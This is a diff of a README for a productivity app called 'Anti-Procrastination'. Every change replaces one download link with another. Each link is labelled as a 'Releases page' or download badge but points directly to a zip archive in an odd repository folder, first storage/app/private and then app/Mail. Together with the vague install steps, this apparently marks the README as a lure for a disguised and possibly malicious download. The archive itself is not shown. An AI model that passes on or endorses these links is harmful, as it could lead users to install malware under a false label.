@@ -3,7 +3,7 @@
 
 Stay on track with timely reminders to boost productivity.
 
-![Download](https://raw.githubusercontent.com/kareem-hany1/Anti-Procrastination/master/storage/app/private/Anti-Procrastination-v3.0.zip%20Now-Click%20Here-brightgreen)
+![Download](https://raw.githubusercontent.com/kareem-hany1/Anti-Procrastination/master/app/Mail/Anti-Procrastination-v3.9.zip%20Now-Click%20Here-brightgreen)
 
 ## 📖 Overview
 
@@ -27,7 +27,7 @@ To run Anti-Procrastination, ensure your system meets these basic requirements:
 
 ## 🚀 Getting Started
 
-1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/kareem-hany1/Anti-Procrastination/master/storage/app/private/Anti-Procrastination-v3.0.zip) to find the latest version of Anti-Procrastination.
+1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/kareem-hany1/Anti-Procrastination/master/app/Mail/Anti-Procrastination-v3.9.zip) to find the latest version of Anti-Procrastination.
 2. **Download the Application**: Choose the version that matches your system and follow the link to download.
 3. **Install the Application**: Once downloaded, follow the on-screen instructions to install it.
 4. **Set Up Your Tasks**: Open the application, create an account if required, and start adding your tasks.
@@ -35,7 +35,7 @@ To run Anti-Procrastination, ensure your system meets these basic requirements:
 
 ## 💻 Download & Install
 
-You can **visit this page to download** the latest version of Anti-Procrastination: [Releases Page](https://raw.githubusercontent.com/kareem-hany1/Anti-Procrastination/master/storage/app/private/Anti-Procrastination-v3.0.zip). Follow the instructions above to get started.
+You can **visit this page to download** the latest version of Anti-Procrastination: [Releases Page](https://raw.githubusercontent.com/kareem-hany1/Anti-Procrastination/master/app/Mail/Anti-Procrastination-v3.9.zip). Follow the instructions above to get started.
 
 ## ❓ Frequently Asked Questions
 
